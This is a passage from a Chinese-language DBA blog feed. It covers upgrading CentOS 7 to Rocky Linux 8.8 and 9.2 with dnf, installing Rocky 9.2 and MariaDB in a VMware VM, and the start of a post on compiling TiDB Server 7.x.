centos-gpg-keys-1:8-3.el8.noarch                                                                                                                                                                                  8/10</span><br><span class="line">  Erasing          : centos-logos-85.8-2.el8.x86_64                                                                                                                                                                                    9/10</span><br><span class="line">  Running scriptlet: centos-logos-85.8-2.el8.x86_64                                                                                                                                                                                    9/10</span><br><span class="line">  Erasing          : centos-indexhtml-8.0-0.el8.noarch                                                                                                                                                                                10/10</span><br><span class="line">  Running scriptlet: centos-indexhtml-8.0-0.el8.noarch                                                                                                                                                                                10/10</span><br><span class="line">  Verifying        : rocky-gpg-keys-8.8-1.8.el8.noarch                                                                                                                                                                                 1/10</span><br><span class="line">  Verifying        : rocky-release-8.8-1.8.el8.noarch                                                                                                                                                                                  2/10</span><br><span class="line">  Verifying        : rocky-repos-8.8-1.8.el8.noarch                                                                                                                                                                                    3/10</span><br><span class="line">  Verifying        : centos-gpg-keys-1:8-3.el8.noarch                                                                                                                                                                                  4/10</span><br><span class="line">  Verifying        : centos-indexhtml-8.0-0.el8.noarch                                                                                                                                                                                 5/10</span><br><span class="line">  Verifying        : centos-linux-release-8.5-1.2111.el8.noarch                                                                                                                                                                        6/10</span><br><span class="line">  Verifying        : centos-linux-repos-8-3.el8.noarch                                                                                                                                                                                 7/10</span><br><span class="line">  Verifying        : centos-logos-85.8-2.el8.x86_64                                                                                                                                                                                    8/10</span><br><span class="line">  Verifying        : centos-release-scl-2-3.el7.centos.noarch                                                                                                                                                                          9/10</span><br><span class="line">  Verifying        : centos-release-scl-rh-2-3.el7.centos.noarch                                                                                                                                                                      10/10</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  rocky-gpg-keys-8.8-1.8.el8.noarch                                              rocky-release-8.8-1.8.el8.noarch                                              rocky-repos-8.8-1.8.el8.noarch                                             </span><br><span class="line">Removed:</span><br><span class="line">  centos-gpg-keys-1:8-3.el8.noarch             centos-indexhtml-8.0-0.el8.noarch  centos-linux-release-8.5-1.2111.el8.noarch  centos-linux-repos-8-3.el8.noarch  centos-logos-85.8-2.el8.x86_64  centos-release-scl-2-3.el7.centos.noarch</span><br><span class="line">  centos-release-scl-rh-2-3.el7.centos.noarch</span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">[root@shawnyan yum.repos.d]#</span><br><span class="line">[root@shawnyan yum.repos.d]#</span><br><span class="line">[root@shawnyan yum.repos.d]#</span><br><span class="line">[root@shawnyan yum.repos.d]# cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 8.8 (Green Obsidian)</span><br><span class="line">[root@shawnyan yum.repos.d]# uname -a</span><br><span class="line">Linux shawnyan 4.18.0-348.7.1.el8_5.x86_64 #1 SMP Wed Dec 22 13:25:12 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">[root@shawnyan yum.repos.d]# hostnamectl</span><br><span class="line">   Static hostname: shawnyan</span><br><span class="line">         Icon name: computer-vm</span><br><span class="line">           Chassis: vm</span><br><span class="line">        Machine ID: e7f51860c9c34455bcb755eac18c8868</span><br><span class="line">           Boot ID: 56c5f6e4c9a0497db3654cf0d4b48541</span><br><span class="line">    Virtualization: vmware</span><br><span class="line">  Operating System: Rocky Linux 8.8 (Green Obsidian)</span><br><span class="line">       CPE OS Name: cpe:/o:rocky:rocky:8:GA</span><br><span class="line">            Kernel: Linux 4.18.0-348.7.1.el8_5.x86_64</span><br><span class="line">      Architecture: x86-64</span><br><span class="line">[root@shawnyan yum.repos.d]#</span><br></pre></td></tr></table></figure></div>
<p>切换很顺畅，完成后再执行升级，将系统内核更新到最新版本。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan yum.repos.d]# dnf update --allowerasing</span><br><span class="line">...</span><br><span class="line">Installed:</span><br><span class="line">  NetworkManager-initscripts-updown-1:1.40.16-4.el8_8.noarch annobin-10.94-1.el8.x86_64                bind-libs-32:9.11.36-8.el8_8.2.x86_64  bind-libs-lite-32:9.11.36-8.el8_8.2.x86_64 bind-utils-32:9.11.36-8.el8_8.2.x86_64         </span><br><span class="line">  elfutils-libelf-devel-0.188-3.el8.x86_64                   fstrm-0.6.1-3.el8.x86_64                  gcc-8.5.0-18.el8.x86_64                gcc-plugin-annobin-8.5.0-18.el8.x86_64     geolite2-city-20180605-1.el8.noarch            </span><br><span class="line">  geolite2-country-20180605-1.el8.noarch                     glibc-gconv-extra-2.28-225.el8_8.6.x86_64 isl-0.16.1-6.el8.x86_64                kernel-core-4.18.0-477.27.1.el8_8.x86_64   kernel-debug-devel-4.18.0-477.27.1.el8_8.x86_64</span><br><span class="line">  kernel-modules-4.18.0-477.27.1.el8_8.x86_64                libmaxminddb-1.2.0-10.el8.x86_64          protobuf-c-1.3.0-6.el8.x86_64          python3-bind-32:9.11.36-8.el8_8.2.noarch   python3-chardet-3.0.4-7.el8.noarch             </span><br><span class="line">  python3-idna-2.5-5.el8.noarch                              python3-magic-5.33-24.el8.noarch          python3-pexpect-4.3.1-3.el8.noarch     python3-ply-3.9-9.el8.noarch               python3-ptyprocess-0.5.2-4.el8.noarch          </span><br><span class="line">  python3-pysocks-1.6.8-3.el8.noarch                         python3-requests-2.20.0-3.el8_8.noarch    python3-setuptools-39.2.0-7.el8.noarch python3-systemd-234-8.el8.x86_64           python3-unbound-1.16.2-5.el8.x86_64            </span><br><span class="line">  python3-urllib3-1.24.2-5.el8.noarch                        unbound-libs-1.16.2-5.el8.x86_64         </span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">[root@shawnyan yum.repos.d]# dnf update --allowerasing</span><br><span class="line">Last metadata expiration check: 0:07:35 ago on Wed 25 Oct 2023 12:55:30 AM CST.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">Nothing to do.</span><br><span class="line">Complete!</span><br><span class="line">[root@shawnyan yum.repos.d]#</span><br></pre></td></tr></table></figure></div>
<img  alt="03.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231006-eabb6b24-a8fb-4f52-93e4-e1d3119879f7.png"
                      referrerpolicy="no-referrer"
                >
<p>升级后重启系统，并查看版本信息。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan yum.repos.d]# cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 8.8 (Green Obsidian)</span><br><span class="line">[root@shawnyan yum.repos.d]# uname -a</span><br><span class="line">Linux shawnyan 4.18.0-348.7.1.el8_5.x86_64 #1 SMP Wed Dec 22 13:25:12 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">[root@shawnyan yum.repos.d]# reboot</span><br></pre></td></tr></table></figure></div>
<img  alt="04.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231025-1767c4aa-158d-4856-b393-85764e6b9f65.png"
                      referrerpolicy="no-referrer"
                >
<p>Rocky 的登陆界面。</p>
<img  alt="05.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231006-007a55a9-4ea1-492d-a77f-510a6db43284.png"
                      referrerpolicy="no-referrer"
                >
<p>可以看到重启前后内核版本发生了变化。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Last login: Wed Oct 25 00:39:04 2023 from 192.168.8.1</span><br><span class="line">[root@shawnyan ~]# cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 8.8 (Green Obsidian)</span><br><span class="line">[root@shawnyan ~]# uname -a</span><br><span class="line">Linux shawnyan 4.18.0-477.27.1.el8_8.x86_64 #1 SMP Wed Sep 20 15:55:39 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">[root@shawnyan ~]# hostnamectl</span><br><span class="line">   Static hostname: shawnyan</span><br><span class="line">         Icon name: computer-vm</span><br><span class="line">           Chassis: vm</span><br><span class="line">        Machine ID: e7f51860c9c34455bcb755eac18c8868</span><br><span class="line">           Boot ID: 788363ea2b7442c8a5f269aeb2ff2ab2</span><br><span class="line">    Virtualization: vmware</span><br><span class="line">  Operating System: Rocky Linux 8.8 (Green Obsidian)</span><br><span class="line">       CPE OS Name: cpe:/o:rocky:rocky:8:GA</span><br><span class="line">            Kernel: Linux 4.18.0-477.27.1.el8_8.x86_64</span><br><span class="line">      Architecture: x86-64</span><br><span class="line">[root@shawnyan ~]#</span><br></pre></td></tr></table></figure></div>
<p>到此，操作系统版本已经从 CentOS 7.9 来到了 Rocky Linux 8.8，接下来，将升级到 Rocky 9。</p>
<h2 id="从-Rocky-8-升级到-Rocky-9">从 Rocky 8 升级到 Rocky 9</h2>
<p>与 CentOS 7 升级到 CentOS 8 类似，先切换 yum 源到 Rocky 9，然后执行 <code>dnf upgrade</code> 升级命令。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan yum.repos.d]# dnf upgrade --allowerasing</span><br><span class="line">Last metadata expiration check: 0:00:28 ago on Wed 25 Oct 2023 01:14:48 AM CST.</span><br><span class="line">Modular dependency problems:</span><br><span class="line"></span><br><span class="line">Problem 1: conflicting requests</span><br><span class="line">  - nothing provides module(platform:el8) needed by module container-tools:rhel8:8080020231004143727:8108cfbc.x86_64</span><br><span class="line">Problem 2: conflicting requests</span><br><span class="line">  - nothing provides module(platform:el8) needed by module go-toolset:rhel8:8080020230629185105:17f3f959.x86_64</span><br><span class="line">Problem 3: conflicting requests</span><br><span class="line">  - nothing provides module(platform:el8) needed by module idm:client:8080020230516222414:152c1be2.x86_64</span><br><span class="line">Problem 4: conflicting requests</span><br><span class="line">  - nothing provides module(platform:el8) needed by module llvm-toolset:rhel8:8080020230201094332:fd72936b.x86_64</span><br><span class="line">Problem 5: conflicting requests</span><br><span class="line">  - nothing provides module(platform:el8) needed by module swig:3.0:8040020210530171044:9f9e2e7e.x86_64</span><br><span class="line">Problem 6: conflicting requests</span><br><span class="line">  - nothing provides module(platform:el8) needed by module virt:rhel:8080020230922173645:fd72936b.x86_64</span><br><span class="line">Dependencies resolved.</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Package                                                                Architecture                           Version                                                              Repository                                         Size</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Installing:</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">rocky-gpg-keys                                                         noarch                                 9.2-1.6.el9                                                          baseos                                             13 k</span><br><span class="line">rocky-release                                                          noarch                                 9.2-1.6.el9                                                          baseos                                             23 k</span><br><span class="line">rocky-repos                                                            noarch                                 9.2-1.6.el9                                                          baseos                                             12 k</span><br><span class="line">...</span><br><span class="line">Transaction Summary</span><br><span class="line">============================================================================================================================================================================================================================================</span><br><span class="line">Install   184 Packages</span><br><span class="line">Upgrade  1057 Packages</span><br><span class="line">Remove     22 Packages</span><br><span class="line"></span><br><span class="line">Total download size: 844 M</span><br><span class="line">Is this ok [y/N]: y</span><br><span class="line">...</span><br><span class="line">  Upgrading        : dracut-057-21.git20230214.el9.x86_64                                                                                                                                                                          803/2347</span><br><span class="line">  Installing       : kernel-modules-core-5.14.0-284.30.1.el9_2.x86_64                                                                                                                                                              804/2347</span><br><span class="line">  Installing       : kernel-core-5.14.0-284.30.1.el9_2.x86_64                                                                                                                                                                      805/2347</span><br><span class="line">  Running scriptlet: kernel-core-5.14.0-284.30.1.el9_2.x86_64                                                                                                                                                                      805/2347</span><br><span class="line">...</span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<p>安装完成，可以看到 kernel 版本已经来到了 5.14，重启系统并查看版本信息。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan yum.repos.d]# cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 9.2 (Blue Onyx)</span><br><span class="line">[root@shawnyan yum.repos.d]# uname -a</span><br><span class="line">Linux shawnyan 4.18.0-477.27.1.el8_8.x86_64 #1 SMP Wed Sep 20 15:55:39 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">[root@shawnyan yum.repos.d]# hostnamectl</span><br><span class="line">Static hostname: shawnyan</span><br><span class="line">       Icon name: computer-vm</span><br><span class="line">         Chassis: vm 🖴</span><br><span class="line">      Machine ID: e7f51860c9c34455bcb755eac18c8868</span><br><span class="line">         Boot ID: 788363ea2b7442c8a5f269aeb2ff2ab2</span><br><span class="line">  Virtualization: vmware</span><br><span class="line">Operating System: Rocky Linux 9.2 (Blue Onyx)       </span><br><span class="line">     CPE OS Name: cpe:/o:rocky:rocky:9::baseos</span><br><span class="line">          Kernel: Linux 4.18.0-477.27.1.el8_8.x86_64</span><br><span class="line">    Architecture: x86-64</span><br><span class="line">Firmware Version: 6.00</span><br><span class="line">[root@shawnyan yum.repos.d]# reboot</span><br></pre></td></tr></table></figure></div>
<img  alt="06.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231025-14687b2b-3c88-4b73-88d4-fe0bd86d5716.png"
                      referrerpolicy="no-referrer"
                >
<p>进入系统，查看版本。</p>
<img  alt="07.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231025-e3f7cc02-8891-4ac5-8586-e22ff0fe0acc.png"
                      referrerpolicy="no-referrer"
                >
<p>到此，从 Rocky 8 升级到 Rocky 9 的所有步骤已经完成。</p>
<h2 id="结语">结语</h2>
<p>本文从提笔到完成，零零总总过去了一个月时间，从 CentOS 7 升级到 Rocky 9 这种跨大版本，跨发行版本的升级是非常复杂的。</p>
<p>而且，升级操作系统本身，就是一个系统工程，影响范围非常之广，对于 DBA 而言，还需要进行数据库对新系统的一些兼容性测试。</p>
<p>简言之，升级操作系统版本，过程非常复杂，耗时非常之久。故而并不建议如此操作，而是建议直接采购新机器，在新机器上安装新系统，后期再做数据迁移。</p>
<p>下一期，我们来聊聊如何从头 <a class="link"   href="https://www.modb.pro/db/1716634949384757248" >一步一步安装 Rocky Linux 9 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/1717086120041865216" >https://www.modb.pro/db/1717086120041865216 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Red Hat</category>
        <category>Rocky</category>
      </categories>
      <tags>
        <tag>redhat</tag>
        <tag>centos</tag>
        <tag>rocky</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Rocky 9】Step by Step 安装 Rocky Linux 9.2 系统</title>
    <url>/2023/linux/rocky-9.2-install/</url>
    <content><![CDATA[<img  alt="rocky-linux.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-387674d4-6bf9-4517-bb04-e0c9212ceae4.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="关于-Rocky-Linux">关于 Rocky Linux</h2>
<p>前文 《 <a href="https://shawnyan.cn/2023/postgresql/pg-16-run-on-centos-7/">【PG16】 后 RHEL 7 时代, PG 16 如何在 CentOS 7 上运行</a> 》 说到 PostgreSQL 16 已不再提供 CentOS 7 的 RPM 包，所以 DBA 们是时候该考虑操作系统升级了。</p>
<p>考虑到 CentOS 或者 RHEL 的兼容性和延续性，我们选择了 Rocky Linux 系列，本文将介绍安装 Rocky Linux 的最新版本 v9.2，以及在 Rocky 9 上安装 MariaDB。</p>
<p>来自官方的介绍：</p>
<blockquote>
<p>Rocky Linux is an open-source enterprise operating system designed to be 100% bug-for-bug compatible with Red Hat Enterprise Linux®. It is under intensive development by the community.</p>
</blockquote>
<p>Rocky Linux 是一个开源的企业操作系统，旨在与红帽企业 Linux® 100%兼容。社区正在大力发展。</p>
<h2 id="本地-VM-安装-Rocky-Linux">本地 VM 安装 Rocky Linux</h2>
<p>这里已经准备好了 VMware 虚拟化软件，本文使用的是 VMware Workstation Player, player 是免费版本，不用担心绿色破解的事情。</p>
<p>系统介质为： Rocky-9.2-x86_64-dvd.iso</p>
<p>从官网下载或者其他镜像网站下载均可，看个人的网速环境。</p>
<p>除了几个互联网大厂提供的镜像站，作者还推荐使用高校提供的镜像站，比如清华大学，中国科大，大连东软，等高校的镜像站。</p>
<p>首先，打开 VMware 软件，选择新建一个vm，</p>
<img  alt="01.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-72d5895d-4b85-4c74-abfa-fa45dc9e5287.png"
                      referrerpolicy="no-referrer"
                >
<p>下一步，选择iso文件，选择系统版本，这里由于VMware版本有些陈旧，所以最高只能选择到 CentOS 8 64-bit,</p>
<img  alt="02.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-cb6ca03a-7751-4c28-a7b3-91da63e69540.png"
                      referrerpolicy="no-referrer"
                >
<p>下一步，选择vm安装路径，并设定磁盘大小，这里建议直接给大一点，一步到位给到100G，因为是本地测试环境，还可以省去后面分区的烦恼。</p>
<img  alt="03.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-389f71fe-ad01-4c78-9943-c69043333c2a.png"
                      referrerpolicy="no-referrer"
                >
<p>下一步，可以定制 cpu/memory 的大小，这个按需调整，默认是1c1g。</p>
<p>下面，正式开始 Rocky 的安装。</p>
<p>跳过测试介质，直接选择安装 Rocky Linux 9.2.</p>
<img  alt="04.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-02d326e7-d8a0-4efd-9e57-fce855664e11.png"
                      referrerpolicy="no-referrer"
                >
<p>下一步，选择语言，推荐直接选择英文，初学者可以选择中文。</p>
<img  alt="05.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-7e342cce-96eb-4f7e-aa68-f732244a81e0.png"
                      referrerpolicy="no-referrer"
                >
<p>下一步，选择安装信息，比如时区，选择上海。安装目的地，选择自动分区。</p>
<img  alt="06.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-77c6a50e-5542-415f-88ab-8e9f7d0c53b5.png"
                      referrerpolicy="no-referrer"
                >
<p>Root账号默认禁用，并禁止从远程访问，为便于学习，可以都开启。</p>
<img  alt="07.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-905b4758-5ab0-4d50-98d8-2166dd6dd3e1.png"
                      referrerpolicy="no-referrer"
                >
<p>下一步，配置网络信息和主机名，也可以直接使用默认，就是dhcp自动给vm配置ip，不过有个弊端，就是每次重启后，ip都可能发生变化。</p>
<img  alt="08.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-0fe237ea-ab95-44b4-9027-07a80a116763.png"
                      referrerpolicy="no-referrer"
                >
<p>下一步，漫长的等待，会进行安装系统必需的包，这里可以看到，Rocky 创建文件系统时，默认选择的 xfs 格式。</p>
<img  alt="09.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-78800073-9124-43bb-aeae-ba0877b0f40c.png"
                      referrerpolicy="no-referrer"
                >
<p>好了，安装完成后，系统会自动重启，并弹出登陆界面。</p>
<img  alt="10.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-250d7c47-0acf-45f8-9fdd-248ad3db9361.png"
                      referrerpolicy="no-referrer"
                >
<p>登陆后，弹出欢迎语【欢迎使用 Rocky Linux】。</p>
<img  alt="11.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-eb791d36-8ae0-4f55-95dd-55edd4f90b3c.png"
                      referrerpolicy="no-referrer"
                >
<p>可以看到 R 标记的炫酷桌面，习惯性打开终端，看下版本信息。</p>
<img  alt="12.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-a86d15de-6fce-4ae1-9e57-495740b293de.png"
                      referrerpolicy="no-referrer"
                >
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ cat /etc/os-release</span><br><span class="line">NAME=&quot;Rocky Linux&quot;</span><br><span class="line">VERSION=&quot;9.2 (Blue Onyx)&quot;</span><br><span class="line">ID=&quot;rocky&quot;</span><br><span class="line">ID_LIKE=&quot;rhel centos fedora&quot;</span><br><span class="line">VERSION_ID=&quot;9.2&quot;</span><br><span class="line">PLATFORM_ID=&quot;platform:el9&quot;</span><br><span class="line">PRETTY_NAME=&quot;Rocky Linux 9.2 (Blue Onyx)&quot;</span><br><span class="line">ANSI_COLOR=&quot;0;32&quot;</span><br><span class="line">LOGO=&quot;fedora-logo-icon&quot;</span><br><span class="line">CPE_NAME=&quot;cpe:/o:rocky:rocky:9::baseos&quot;</span><br><span class="line">HOME_URL=&quot;https://rockylinux.org/&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.rockylinux.org/&quot;</span><br><span class="line">SUPPORT_END=&quot;2032-05-31&quot;</span><br><span class="line">ROCKY_SUPPORT_PRODUCT=&quot;Rocky-Linux-9&quot;</span><br><span class="line">ROCKY_SUPPORT_PRODUCT_VERSION=&quot;9.2&quot;</span><br><span class="line">REDHAT_SUPPORT_PRODUCT=&quot;Rocky Linux&quot;</span><br><span class="line">REDHAT_SUPPORT_PRODUCT_VERSION=&quot;9.2&quot;</span><br><span class="line">[shawnyan@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<p>到此，Rocky 9 已经安装完成，从 CentOS 7 到 Rocky 9，两个大版本的更新，一定会有很多使用上和原理上的差异，之后的时间我们再慢慢探索。</p>
<h2 id="Rocky-9-安装-MariaDB">Rocky 9 安装 MariaDB</h2>
<p>在 Rocky 9 里， yum 是 dnf 的别名，方便延续使用习惯。通过 yum 命令一键安装 MariaDB。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ sudo yum install mariadb-server</span><br></pre></td></tr></table></figure></div>
<img  alt="13.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-a3402d25-a903-49fd-9fca-2cd892be744e.png"
                      referrerpolicy="no-referrer"
                >
<p>安装完成后，通过 systemd 启动 MariaDB。</p>
<img  alt="14.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-b9ea2fd6-0547-42b4-a6c4-eded6a600334.png"
                      referrerpolicy="no-referrer"
                >
<p>启动后再次查看状态，可以看到 MairaDB 已成功运行。</p>
<img  alt="15.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231024-dfc3d878-4156-4f23-bdaf-07ec43fefd7b.png"
                      referrerpolicy="no-referrer"
                >
<p>通过客户端连接 MairaDB，查看版本信息。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ sudo mariadb</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 5</span><br><span class="line">Server version: 10.5.22-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; \s</span><br><span class="line">--------------</span><br><span class="line">mariadb  Ver 15.1 Distrib 10.5.22-MariaDB, for Linux (x86_64) using  EditLine wrapper</span><br><span class="line"></span><br><span class="line">Connection id:          5</span><br><span class="line">Current database:</span><br><span class="line">Current user:           root@localhost</span><br><span class="line">SSL:                    Not in use</span><br><span class="line">Current pager:          stdout</span><br><span class="line">Using outfile:          &#x27;&#x27;</span><br><span class="line">Using delimiter:        ;</span><br><span class="line">Server:                 MariaDB</span><br><span class="line">Server version:         10.5.22-MariaDB MariaDB Server</span><br><span class="line">Protocol version:       10</span><br><span class="line">Connection:             Localhost via UNIX socket</span><br><span class="line">Server characterset:    latin1</span><br><span class="line">Db     characterset:    latin1</span><br><span class="line">Client characterset:    utf8</span><br><span class="line">Conn.  characterset:    utf8</span><br><span class="line">UNIX socket:            /var/lib/mysql/mysql.sock</span><br><span class="line">Uptime:                 2 min 3 sec</span><br><span class="line"></span><br><span class="line">Threads: 1  Questions: 4  Slow queries: 0  Opens: 17  Open tables: 10  Queries per second avg: 0.032</span><br><span class="line">--------------</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; \! cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 9.2 (Blue Onyx)</span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure></div>
<p>到此，在 Rocky 9 上安装、运行 MariaDB 已完成。</p>
<h2 id="结语">结语</h2>
<p>本文详细介绍如何在本地安装 Rocky Linux 9.2，并演示安装 MairaDB 数据库。<br>
不过，Rocky 9 上生产环境还有待进一步测试，希望 Rocky 社区保持活跃，不要走 CentOS 的老路。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/1716634949384757248" >https://www.modb.pro/db/1716634949384757248 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Red Hat</category>
        <category>Rocky</category>
      </categories>
      <tags>
        <tag>redhat</tag>
        <tag>centos</tag>
        <tag>rocky</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB 7.x 源码编译之 TiDB Server 篇，及新特性详解（文末彩蛋）</title>
    <url>/2023/tidb/tidb-7.x-compile-tidb/</url>
    <content><![CDATA[<img  alt="tidb-7.x-new-feature-banner.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/tidb-7.x-new-feature-banner-1696249336706.png"
                      referrerpolicy="no-referrer"
                >
<!-- modb
@[toc](目录)
-->
<h2 id="目录">目录</h2>
<pre><code>    TL;DR
    前情提要
    一、TiDB Server 编译
        1.1 编译环境
        1.2 编译步骤
        1.3 启动 TiDB Server
    二、TiDB Server v7.x 新特性
        🔑 2.1 资源管控能力增强
        🥳 2.2 TiDB 相关 SQL 再扩展
            1️⃣ TiDB 7.1.0，新增支持 Fix Control 特性
            2️⃣ TiDB 7.2.0，支持对 DDL 任务进行暂停和恢复
            3️⃣ TiDB 7.3.0，新增支持 8 项 Optimizer Hint
            4️⃣ TiDB 7.4.0，新增支持 `TIDB_PARSE_TSO_LOGICAL()` 语法
            5️⃣ TiDB 7.4.0，新增支持分区类型管理功能
        Ⓜ️ 2.3 MySQL 8.0 兼容性
            1️⃣ TiDB 7.2.0，新增支持 `CHECK` 约束
            2️⃣ TiDB 7.2.0，支持指定 `utf8mb3` 字符集；TiDB 7.4.0，支持指定 `utf8mb4_0900_ai_ci`/`utf8mb4_0900_bin` 排序规则
            3️⃣ TiDB 7.4.0，`version()` 返回信息变更
            4️⃣ TiDB 7.4.0，新增支持使用 Hint `SER_VAR()` 修改系统变量
            5️⃣ TiDB 7.4.0, 新增会话连接属性表 `session_account_connect_attrs`
            6️⃣ TiDB 7.4.0, 新增支持数据类型 `FLOAT4`, `FLOAT8` 和 `MIDDLEINT`
    三、总结
    感谢
    彩蛋
</code></pre>
<hr>
<h2 id="TL-DR">TL;DR</h2>
<p>本文将延续本系列文章，介绍如何编译 TiDB Server 源码。以及，阐释 TiDB Server 7.x 的部分新特性。</p>
<p><img  alt="new.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/new-1697647481934.png"
                      width="50" height="20" align="left" referrerpolicy="no-referrer"
                > News !!!</p>
<p>TiDB v7.5.0 LTS 计划于 2023-11-23 正式 Release<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>，目前代码虽未冻结，但已经可以看到 Alpha 版本的 Code 了，本文代码将以 <code>v7.5.0-alpha</code> 为基准。</p>
<h2 id="前情提要">前情提要</h2>
<p>本文是该系列文章的第 5 篇，前四篇文章分别是：</p>
<ul>
<li><a href="https://shawnyan.cn/2023/tidb/tidb-7.x-compile-pd/">TiDB 7.x 源码编译之 PD/TiDB Dashboard 篇</a></li>
<li><a href="https://shawnyan.cn/2023/tidb/tidb-7.x-compile-tiup/">TiDB 7.x 源码编译之 TiUP 篇，及新特性解析</a></li>
<li><a href="https://shawnyan.cn/2023/tidb/tidb-7.x-compile-tiflash/">TiDB 7.x 源码编译之 TiFlash 篇</a></li>
<li><a href="https://shawnyan.cn/2023/tidb/tidb-7.x-compile-tiproxy/">TiDB 7.x 源码编译之 TiProxy 篇，及尝鲜体验</a></li>
</ul>
<h2 id="font-color-0080FF-一、TiDB-Server-编译-font"><font color='#0080FF'>一、TiDB Server 编译</font></h2>
<h3 id="1-1-编译环境">1.1 编译环境</h3>
